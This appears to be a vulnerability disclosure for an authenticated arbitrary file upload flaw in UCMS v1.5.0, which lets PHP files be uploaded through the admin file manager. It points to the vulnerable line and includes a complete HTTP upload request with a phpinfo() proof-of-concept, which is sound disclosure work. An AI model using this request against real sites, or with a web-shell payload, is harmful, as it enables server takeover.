# UCMS v1.5.0 Arbitrary file upload vulnerability

## Vulnerability Type :

File upload



## Vulnerability Version :

1.5.0



## Recurring environment:

- Windows 10
- PHP 5.6.40
- Apache 2.4.23



## Vulnerability Description 

1、The current version is V1.5.0



The vulnerability is in the \UCMS_1.5.0\UCMS\sadmin\file.php #107

Upload file suffixes are not verified. It has been uploaded directly using the move_uploaded_file function, resulting in any file being uploaded



![image-20201124154619280](https://gitee.com/godzeo/blogimg/raw/master/img/20201124154619.png)





# Vulnerability recurrence:

1、 Visit http://127.0.0.1/ucms/login.php  login the system

2、Click the Upload button to upload the file directly, or use the packet provided below

![image-20201124155416626](https://gitee.com/godzeo/blogimg/raw/master/img/20201124155416.png)

3、packet

```
POST /ucms/index.php?do=sadmin_file&dir=/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/ucms/index.php?do=sadmin_file
Content-Type: multipart/form-data; boundary=---------------------------38980395742265594671642291033
Content-Length: 364
Origin: http://127.0.0.1
Connection: close
Cookie: admin_02ad46=admin; psw_02ad46=e00fbc7a2e9f0149ccd5e45ace4b352f; token_02ad46=df5f414f; JSESSIONID=2DCDAC60EB1691F73601A47ECB790B43; remember-me=YWRtaW46MTYwNzM5MDc3Nzk4MDo1MmEyYmJiNjRlNzdiOTYwMzEwZmZkYWE3Njk4MjMyMA; XSRF-TOKEN=ffcf9902-26a9-4e2f-b78f-3b6041fe5a44; PHPSESSID=b96f85658dfc1c3f0d1600388ef74b3d
Upgrade-Insecure-Requests: 1

-----------------------------38980395742265594671642291033
Content-Disposition: form-data; name="uuu_token"

df5f414f
-----------------------------38980395742265594671642291033
Content-Disposition: form-data; name="uploadfile"; filename="test.php"
Content-Type: text/php

<?php phpinfo();?>

-----------------------------38980395742265594671642291033--
```

![image-20201124155327537](https://gitee.com/godzeo/blogimg/raw/master/img/20201124155327.png)



4、Verified upload successful

![image-20201124155638758](https://gitee.com/godzeo/blogimg/raw/master/img/20201124155638.png)

v
